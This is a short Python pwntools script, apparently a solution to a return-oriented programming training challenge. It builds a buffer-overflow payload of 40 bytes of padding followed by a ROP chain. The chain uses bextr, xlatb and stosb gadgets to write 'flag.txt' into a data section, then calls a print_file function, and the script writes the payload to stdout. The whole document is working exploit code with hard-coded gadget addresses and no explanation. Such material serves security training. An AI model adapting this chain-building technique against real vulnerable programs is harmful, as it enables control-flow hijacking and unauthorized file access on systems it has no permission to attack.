from pwn import *
import sys

data_addr = 0x00601028
pop_rdi = 0x00000000004006a3         # pop rdi ; ret
print_file_addr = 0x00400510

write_gadget_1 = 0x0040062a          # pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret
write_gadget_2 = 0x0000000000400628  # xlatb ; ret
write_gadget_3 = 0x0000000000400639  # stosb byte ptr [rdi], al ; ret


char_map = {'f': 0x0040058a, 'l': 0x004003e4, 'a': 0x00400424,
            'g': 0x004003cf, '.': 0x004003fd, 't': 0x004003e0,
            'x': 0x00400725}
target_str = "flag.txt"

def write_in_data(addrs):
    p = b""
    al = 11
    for i,char in enumerate(target_str):
        read_addr = char_map[char]
        # set rbx to read_addr
        # rdx[....|LENGTH|START]  to extract higher 32 bits
        rdx = p8(32) + p8(32) + p32(0) + p16(0)
        # rcx = 0xAAAAAAAA0000000 + 0x3ef2 = 0xAAAAAAAA00003ef2
        rcx = p32(0) + p32(read_addr - al)
        p += p64(write_gadget_1) + rdx + rcx
        # xlab does al = [rbx+al]
        p += p64(write_gadget_2)
        p += p64(pop_rdi) + p64(data_addr + i)
        p += p64(write_gadget_3)
        al = ord(char)
    return p

payload = b"A" * 40
payload += write_in_data(char_map)  
payload += p64(pop_rdi)
payload += p64(data_addr)           
payload += p64(print_file_addr)

sys.stdout.buffer.write(payload)

